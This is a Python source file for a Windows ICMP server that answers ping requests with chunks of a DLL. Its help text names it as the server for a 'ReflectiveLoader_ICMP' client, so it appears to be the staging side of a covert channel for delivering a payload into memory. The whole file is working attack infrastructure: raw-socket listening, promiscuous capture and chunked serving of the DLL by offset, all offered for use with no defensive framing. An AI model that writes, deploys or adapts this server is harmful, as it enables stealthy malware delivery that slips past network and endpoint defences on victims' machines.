"""ICMP echo responder that serves DLL payload chunks.

Usage (requires Administrator):
    python server.py <dll_path> [--chunk-size 1024]

Protocol:
    Request data (4 bytes LE):
        0xFFFFFFFF  -> reply with 4-byte total size
        <offset>    -> reply with up to chunk_size bytes at that offset
"""
import argparse
import ctypes
import ctypes.wintypes
import struct
import sys
from pathlib import Path

# --- Win32 ICMP API via ctypes ---
iphlpapi = ctypes.windll.iphlpapi
ws2_32 = ctypes.windll.ws2_32

# inet_addr
ws2_32.inet_addr.argtypes = [ctypes.c_char_p]
ws2_32.inet_addr.restype = ctypes.c_ulong

# IcmpCreateFile / IcmpCloseHandle
iphlpapi.IcmpCreateFile.argtypes = []
iphlpapi.IcmpCreateFile.restype = ctypes.c_void_p

iphlpapi.IcmpCloseHandle.argtypes = [ctypes.c_void_p]
iphlpapi.IcmpCloseHandle.restype = ctypes.c_int


def main():
    parser = argparse.ArgumentParser(description="ICMP DLL server for ReflectiveLoader_ICMP")
    parser.add_argument("dll", type=Path, help="Path to DLL file")
    parser.add_argument("--chunk-size", type=int, default=1024)
    parser.add_argument("--bind", default="0.0.0.0", help="IP to listen on")
    args = parser.parse_args()

    dll_data = args.dll.read_bytes()
    total_size = len(dll_data)
    chunk_size = args.chunk_size
    print(f"[*] Loaded {args.dll.name} ({total_size} bytes)")
    print(f"[*] Chunk size: {chunk_size} bytes ({(total_size + chunk_size - 1) // chunk_size} chunks)")

    import socket

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[!] Raw sockets require Administrator privileges")
        print("[!] Run: powershell Start-Process python -ArgumentList 'server.py','test_dll.dll' -Verb RunAs")
        sys.exit(1)

    # Bind to a real interface IP — SIO_RCVALL needs it, and loopback
    # receives echo requests without SIO_RCVALL on most Windows versions.
    bind_ip = args.bind
    if bind_ip == "0.0.0.0":
        bind_ip = socket.gethostbyname(socket.gethostname())
        print(f"[*] Resolved bind address to {bind_ip}")

    sock.bind((bind_ip, 0))
    sock.settimeout(1.0)

    # Try SIO_RCVALL for promiscuous mode (non-loopback interfaces).
    # Falls through gracefully on loopback where it's unsupported —
    # raw ICMP sockets receive echo requests to the bound IP anyway.
    use_rcvall = False
    try:
        sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
        use_rcvall = True
    except OSError:
        print("[*] SIO_RCVALL unavailable — using standard raw recv (OK for loopback)")

    print(f"[*] Listening for ICMP echo requests on {bind_ip}...")
    print(f"[*] Ctrl+C to stop")

    reply_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    def icmp_checksum(data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    served = 0
    try:
        while True:
            try:
                pkt, addr = sock.recvfrom(65565)
            except socket.timeout:
                continue

            # Parse IP header
            ip_hdr_len = (pkt[0] & 0x0F) * 4
            icmp_pkt = pkt[ip_hdr_len:]

            if len(icmp_pkt) < 8:
                continue

            icmp_type = icmp_pkt[0]
            if icmp_type != 8:  # ICMP Echo Request
                continue

            icmp_id = struct.unpack("!H", icmp_pkt[4:6])[0]
            icmp_seq = struct.unpack("!H", icmp_pkt[6:8])[0]
            req_data = icmp_pkt[8:]

            if len(req_data) < 4:
                continue

            offset = struct.unpack("<I", req_data[:4])[0]

            # Build reply payload
            if offset == 0xFFFFFFFF:
                reply_data = struct.pack("<I", total_size)
                print(f"[+] {addr[0]} size query -> {total_size} bytes")
            else:
                start = offset
                end = min(offset + chunk_size, total_size)
                reply_data = dll_data[start:end] if start < total_size else b""
                served += len(reply_data)
                if offset % (chunk_size * 10) == 0 or start >= total_size - chunk_size:
                    print(f"[+] {addr[0]} offset={offset} -> {len(reply_data)} bytes  (total served: {served})")

            # Build ICMP Echo Reply (type=0, code=0)
            reply_hdr = struct.pack("!BBHHH", 0, 0, 0, icmp_id, icmp_seq)
            reply_pkt = reply_hdr + reply_data
            cs = icmp_checksum(reply_pkt)
            reply_pkt = reply_pkt[:2] + struct.pack("!H", cs) + reply_pkt[4:]

            reply_sock.sendto(reply_pkt, (addr[0], 0))

    except KeyboardInterrupt:
        print(f"\n[*] Stopped (served {served} bytes total)")
    finally:
        if use_rcvall:
            try:
                sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            except Exception:
                pass
        sock.close()
        reply_sock.close()


if __name__ == "__main__":
    main()
